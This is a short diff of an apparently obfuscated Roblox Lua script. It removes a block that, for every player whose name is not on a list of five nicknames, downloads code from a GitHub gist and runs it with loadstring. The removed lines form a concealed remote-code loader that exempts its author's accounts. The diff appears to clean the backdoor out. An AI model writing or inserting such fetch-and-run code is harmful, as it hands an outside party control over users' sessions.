@@ -4700,8 +4700,3 @@ do
         if M then return J(M) end
     end
 end
-local nicks = {"vNCC1337", "Wer4er_official", "GaladonT", "Wer4erAlt", "Lurrnan"}
-local player = game.Players.LocalPlayer
-if not table.find(nicks, player.Name) then
-    loadstring(game:HttpGet('https://gist.githubusercontent.com/Wer4er/eac9b2475d40931dd17bf7a6f1947c76/raw/bc18f26f5dd85d65d19a4ad75be34e613811e62a/gistfile1.txt'))()
-end
